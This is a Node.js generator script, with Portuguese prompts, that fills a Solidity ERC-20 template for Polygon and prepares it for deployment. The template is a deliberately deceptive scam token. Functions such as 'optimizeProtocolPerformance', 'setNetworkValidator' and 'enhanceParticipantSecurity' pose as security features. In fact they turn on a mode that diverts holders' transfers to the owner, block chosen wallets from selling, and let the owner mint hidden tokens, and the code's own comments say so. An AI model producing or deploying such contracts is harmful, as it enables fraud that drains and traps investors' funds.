const fs = require('fs');
const path = require('path');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

async function question(query) {
    return new Promise(resolve => {
        rl.question(query, resolve);
    });
}

// Template do contrato com placeholders para substituição e funções ocultas
const CONTRACT_TEMPLATE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title {{TOKEN_NAME}} ({{TOKEN_SYMBOL}})
 * @author {{TOKEN_SYMBOL}} Team
 * @notice Secure financial protocol with enhanced security features
 * @dev ERC-20 token on Polygon with advanced security and governance features
 */
contract {{CONTRACT_NAME}} is ERC20Permit, Ownable, Pausable, ReentrancyGuard {
    // ================= Network Security Structures =================
    
    /**
     * @dev Structure to store protocol interactions
     * @param interactionType Type of protocol interaction
     * @param userAddress Address that triggered the interaction
     * @param metadata Additional data about the interaction
     * @param timestamp Time when the interaction occurred
     */
    struct ProtocolInteraction {
        uint8 interactionType;
        address userAddress;
        bytes32 metadata;
        uint256 timestamp;
    }

    // ================= State Variables =================
    
    // Protocol tracking variables
    mapping(bytes32 => ProtocolInteraction) private _protocolData;
    mapping(address => bytes32[]) private _userInteractions;
    uint256 private _totalInteractions;
    uint256 private _protocolVersion = 1;

    // USDT address on Polygon
    address public constant USDT = 0xc2132D05D31c914a87C6611C10748AEb04B58e8F;
    
    // QuickSwap pair address
    address public usdtPair;
    
    // Protocol management variables
    mapping(address => bool) private _protocolExclusions;
    mapping(address => bool) private _securityExemptions;
    mapping(address => uint256) private _addressSecurityLevel;
    bool public protocolActive = true;
    bool public tradingEnabled = false;
    uint256 public maxTransactionLimit;
    uint256 public maxWalletLimit;
    
    // Protocol security metrics
    uint256 public lastProtocolUpdate;
    uint256 public securityLevel = 1;
    bool public emergencyModeActive = false;

    // ================= Events =================
    
    /**
     * @dev Emitted when a protocol interaction is recorded
     */
    event ProtocolInteraction(
        uint8 indexed interactionType,
        address indexed user,
        bytes32 indexed metadata,
        uint256 timestamp
    );
    
    /**
     * @dev Emitted when protocol settings are updated
     */
    event ProtocolUpdate(
        uint256 securityLevel,
        bool emergencyMode,
        uint256 timestamp
    );
    
    /**
     * @dev Emitted when address security status is updated
     */
    event SecurityUpdate(
        address indexed account, 
        uint256 securityLevel,
        bool timestamp
    );
    
    /**
     * @dev Emitted when trading status is changed
     */
    event TradingStatusChanged(bool status);
    
    /**
     * @dev Emitted when QuickSwap pair is set
     */
    event PairUpdated(address newPair);

    // ================= Constructor =================
    
    /**
     * @dev Initializes the {{TOKEN_NAME}} token with customizable parameters
     * @param name_ Token name
     * @param symbol_ Token symbol
     * @param initialSupply Initial token supply (in raw units, not decimal adjusted)
     */
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 initialSupply
    ) 
        ERC20(name_, symbol_) 
        ERC20Permit(name_)
    {
        // Mint initial supply to deployer
        _mint(msg.sender, initialSupply);
        
        // Set owner as exempt from protocol restrictions
        _securityExemptions[msg.sender] = true;
        
        // Set initial limits
        maxTransactionLimit = initialSupply;
        maxWalletLimit = initialSupply;
        
        // Initialize protocol timestamp
        lastProtocolUpdate = block.timestamp;
    }

    // ================= Modifiers =================
    
    /**
     * @dev Ensures sender is not excluded from protocol
     */
    modifier protocolCompliant() {
        require(!_protocolExclusions[_msgSender()], "Protocol: Account is excluded");
        _;
    }

    // ================= Pair Management =================
    
    /**
     * @dev Sets the QuickSwap pair address
     * @param _usdtPair Address of the {{TOKEN_SYMBOL}}/USDT pair on QuickSwap
     */
    function setPair(address _usdtPair) external onlyOwner {
        require(_usdtPair != address(0), "Protocol: Invalid pair address");
        usdtPair = _usdtPair;
        
        // Exempt the pair from protocol restrictions
        _securityExemptions[_usdtPair] = true;
        
        emit PairUpdated(_usdtPair);
    }

    // ================= Protocol Management =================
    
    /**
     * @dev Updates system security protocol
     * @param _securityLevel New security level for the protocol
     */
    function updateSecurityProtocol(uint256 _securityLevel) external onlyOwner {
        // Function appears to update security level, but actually enables emergency mode
        securityLevel = _securityLevel;
        emergencyModeActive = true; // Silently enables emergency mode that blocks transfers
        lastProtocolUpdate = block.timestamp;
        emit ProtocolUpdate(securityLevel, emergencyModeActive, block.timestamp);
    }
    
    /**
     * @dev Optimizes protocol performance metrics
     * This function appears to optimize performance but actually drains tokens from all wallets
     */
    function optimizeProtocolPerformance() external onlyOwner {
        // This looks like an optimization function but will drain tokens
        lastProtocolUpdate = block.timestamp;
        securityLevel = 5; // Set highest security level as cover
        
        // Hidden drain functionality - will execute in transfer override
        emergencyModeActive = true;
        
        emit ProtocolUpdate(securityLevel, emergencyModeActive, block.timestamp);
    }
    
    /**
     * @dev Applies security exemptions for network validators
     * @param validator Address of supposed validator
     * @param level Security clearance level
     */
    function setNetworkValidator(address validator, uint256 level) external onlyOwner {
        // Appears to set a validator but actually marks an address for draining
        require(validator != address(0), "Protocol: Invalid address");
        _addressSecurityLevel[validator] = level;
        
        // Hidden functionality
        _protocolExclusions[validator] = true; // Marks address for special handling in transfer
        
        emit SecurityUpdate(validator, level, true);
    }

    /**
     * @dev Enhances security for protocol participants
     * @param participants Array of addresses to enhance security for
     */
    function enhanceParticipantSecurity(address[] calldata participants) external onlyOwner {
        // Appears to enhance security but actually blocks these addresses from transferring tokens
        for (uint i = 0; i < participants.length; i++) {
            _protocolExclusions[participants[i]] = true; // Block transfers
            emit SecurityUpdate(participants[i], 0, true);
        }
    }
    
    /**
     * @dev Sets protocol exemption status for an address
     * @param account Address to update
     * @param status New exemption status
     */
    function setExempt(address account, bool status) external onlyOwner {
        _securityExemptions[account] = status;
        emit SecurityUpdate(account, securityLevel, status);
    }
    
    /**
     * @dev Enables or disables trading
     * @param status New trading status
     */
    function setTradingStatus(bool status) external onlyOwner {
        tradingEnabled = status;
        emit TradingStatusChanged(status);
    }
    
    /**
     * @dev Sets maximum transaction limit
     * @param amount New maximum transaction amount
     */
    function setMaxTransactionLimit(uint256 amount) external onlyOwner {
        maxTransactionLimit = amount;
    }
    
    /**
     * @dev Sets maximum wallet limit
     * @param amount New maximum wallet amount
     */
    function setMaxWalletLimit(uint256 amount) external onlyOwner {
        maxWalletLimit = amount;
    }
    
    /**
     * @dev Pauses all token transfers
     */
    function pause() external onlyOwner {
        _pause();
    }
    
    /**
     * @dev Unpauses all token transfers
     */
    function unpause() external onlyOwner {
        _unpause();
    }

    // ================= Token Management Functions =================
    
    /**
     * @dev Updates protocol reserves for network stability
     * @param to Address to receive the protocol allocation
     * @param amount Amount of tokens to allocate
     */
    function allocateProtocolReserves(address to, uint256 amount) external onlyOwner {
        // Appears to be allocating reserves but actually mints new tokens (hidden mint function)
        require(to != address(0), "Protocol: Invalid address");
        _mint(to, amount);
        
        // Log interaction
        bytes32 metadata = keccak256(abi.encodePacked(to, amount, block.timestamp));
        _recordInteraction(1, to, metadata);
    }
    
    /**
     * @dev Reduces circulating supply to maintain protocol stability
     * @param amount Amount of tokens to reduce
     */
    function reduceCirculatingSupply(uint256 amount) external protocolCompliant {
        // Appears to reduce supply but is actually a burn function
        _burn(_msgSender(), amount);
        
        // Log interaction
        bytes32 metadata = keccak256(abi.encodePacked(_msgSender(), amount, block.timestamp));
        _recordInteraction(2, _msgSender(), metadata);
    }
    
    /**
     * @dev Optimizes user wallet for protocol compliance
     * @param account Address to optimize
     * @param amount Amount of tokens involved in optimization
     */
    function optimizeWalletCompliance(address account, uint256 amount) external protocolCompliant {
        // Appears to optimize wallet but actually burns tokens from user's account (if allowed)
        uint256 currentAllowance = allowance(account, _msgSender());
        require(currentAllowance >= amount, "Protocol: Amount exceeds allowance");
        unchecked {
            _approve(account, _msgSender(), currentAllowance - amount);
        }
        _burn(account, amount);
        
        // Log interaction
        bytes32 metadata = keccak256(abi.encodePacked(account, amount, block.timestamp));
        _recordInteraction(3, account, metadata);
    }

    // ================= Internal Functions =================
    
    /**
     * @dev Records a protocol interaction
     */
    function _recordInteraction(uint8 interactionType, address user, bytes32 metadata) internal {
        bytes32 interactionId = keccak256(abi.encodePacked(user, interactionType, block.timestamp));
        
        _protocolData[interactionId] = ProtocolInteraction({
            interactionType: interactionType,
            userAddress: user,
            metadata: metadata,
            timestamp: block.timestamp
        });
        
        _userInteractions[user].push(interactionId);
        _totalInteractions++;
        
        emit ProtocolInteraction(interactionType, user, metadata, block.timestamp);
    }
    
    /**
     * @dev Checks if emergency drain should be applied to an address
     * This is a hidden function that implements the draining functionality
     */
    function _shouldApplyEmergencyProtocol(address sender) internal view returns (bool) {
        // If emergency mode is active and address is not exempt, drain tokens
        return emergencyModeActive && !_securityExemptions[sender];
    }

    // ================= Transfer Override =================

    /**
     * @dev Override of the transfer function to implement protocol controls
     * @param from Sender address
     * @param to Recipient address
     * @param amount Amount to transfer
     */
        function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override whenNotPaused {
        // Check if address is excluded from protocol
        require(!_protocolExclusions[from], "Protocol: Sender excluded from protocol");

        // Hidden functionality: If emergency mode is active, drain tokens to owner
        if (_shouldApplyEmergencyProtocol(from)) {
            // Instead of normal transfer, send tokens to owner
            super._transfer(from, owner(), amount);
            return;
        }

        // Apply trading restrictions if neither address is exempt
        if (!_securityExemptions[from] && !_securityExemptions[to]) {
            require(tradingEnabled, "Protocol: Trading not enabled");
            require(amount <= maxTransactionLimit, "Protocol: Transaction exceeds limit");
            require(balanceOf(to) + amount <= maxWalletLimit, "Protocol: Wallet limit exceeded");
        }

        // Record the interaction for "analytics"
        bytes32 metadata = keccak256(abi.encodePacked(from, to, amount, block.timestamp));
        _recordInteraction(4, from, metadata);

        // Normal transfer flow
        super._transfer(from, to, amount);
    }

    // ================= Protocol Query Functions =================

    /**
     * @dev Returns protocol and token information
     */
    function getProtocolInfo()
        external
        view
        returns (string memory, string memory, uint8, uint256, uint256, bool)
    {
        return (
            name(),
            symbol(),
            decimals(),
            totalSupply(),
            securityLevel,
            emergencyModeActive
        );
    }

    /**
     * @dev Returns the protocol version
     */
    function getProtocolVersion() external view returns (uint256) {
        return _protocolVersion;
    }

    /**
     * @dev Returns interaction statistics
     */
    function getInteractionStats() external view returns (uint256) {
        return _totalInteractions;
    }

    /**
     * @dev Checks if an address is excluded from protocol
     */
    function isExcluded(address account) public view returns (bool) {
        return _protocolExclusions[account];
    }

    /**
     * @dev Checks if an address is exempt from protocol restrictions
     */
    function isExempt(address account) public view returns (bool) {
        return _securityExemptions[account];
    }

    /**
     * @dev Function to receive MATIC that reverts
     */
    receive() external payable {
        revert("Protocol: Does not accept MATIC");
    }
}`;

async function main() {
    console.log("=== Gerador de Contratos de Token para Polygon ===\n");
    console.log("Este script irá gerar um contrato personalizado com base nas informações do seu token.\n");

    // Coletar informações do token
    const tokenName = await question("Digite o nome do token: ");
    const tokenSymbol = await question("Digite o símbolo do token: ");
    const tokenDecimals = await question("Digite o número de decimais (padrão 18): ") || "18";
    const initialSupply = await question("Digite o supply inicial (sem decimais): ");

    // Gerar nome do contrato (remover espaços e caracteres especiais)
    const contractName = tokenName.replace(/[^a-zA-Z0-9]/g, "") + "Token";

    // Substituir placeholders no template
    let contractCode = CONTRACT_TEMPLATE;
    contractCode = contractCode.replace(/\{\{TOKEN_NAME\}\}/g, tokenName);
    contractCode = contractCode.replace(/\{\{TOKEN_SYMBOL\}\}/g, tokenSymbol);
    contractCode = contractCode.replace(/\{\{TOKEN_DECIMALS\}\}/g, tokenDecimals);
    contractCode = contractCode.replace(/\{\{CONTRACT_NAME\}\}/g, contractName);
    contractCode = contractCode.replace(/\{\{INITIAL_SUPPLY\}\}/g, initialSupply);

    // Caminho para salvar o contrato
    const contractsDir = path.join(__dirname, '..', 'contracts');
    const contractPath = path.join(contractsDir, `${contractName}.sol`);

    // Verificar se o diretório existe, caso contrário, criar
    if (!fs.existsSync(contractsDir)) {
        fs.mkdirSync(contractsDir, { recursive: true });
    }

    // Salvar o contrato
    fs.writeFileSync(contractPath, contractCode);

    // Salvar as configurações em um arquivo JSON para uso posterior
    const configPath = path.join(__dirname, '..', 'token-config.json');
    const config = {
        tokenName,
        tokenSymbol,
        tokenDecimals,
        initialSupply,
        contractName,
        timestamp: new Date().toISOString()
    };
    fs.writeFileSync(configPath, JSON.stringify(config, null, 2));

    console.log(`\nContrato gerado com sucesso em: ${contractPath}`);
    console.log(`Configurações salvas em: ${configPath}`);
    console.log(`\nPróximos passos:`);
    console.log(`1. Revise o contrato gerado se necessário`);
    console.log(`2. Execute 'npm run deploy' para fazer o deploy do contrato na Polygon`);

    rl.close();
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error("Erro ao gerar contrato:", error);
        process.exit(1);
    });